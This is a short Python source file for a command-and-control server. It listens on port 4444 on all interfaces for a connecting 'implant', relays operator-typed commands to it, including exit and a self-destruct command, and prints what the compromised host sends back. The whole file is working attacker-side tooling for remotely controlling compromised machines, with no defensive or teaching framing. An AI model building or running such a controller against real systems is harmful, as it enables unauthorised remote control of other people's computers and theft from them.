# c2_server.py
import socket

HOST = '0.0.0.0'
PORT = 4444  # Make sure this port is not blocked or already in use

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)

print("[*] Waiting for implant connection...")
conn, addr = server.accept()
print(f"[+] Connection from {addr}")

try:
    while True:
        cmd = input("C2> ").strip()
        if not cmd:
            continue
        conn.sendall(cmd.encode() + b"\n")
        if cmd == "exit":
            break
        elif cmd == "destroy":
            # handle self-destruct
            break
        

        # Receive response
        data = b""
        while True:
            part = conn.recv(1024)
            if not part:
                break
            data += part
            if len(part) < 1024:
                break
        print(data.decode(errors="ignore"))
except KeyboardInterrupt:
    pass

conn.close()
server.close()
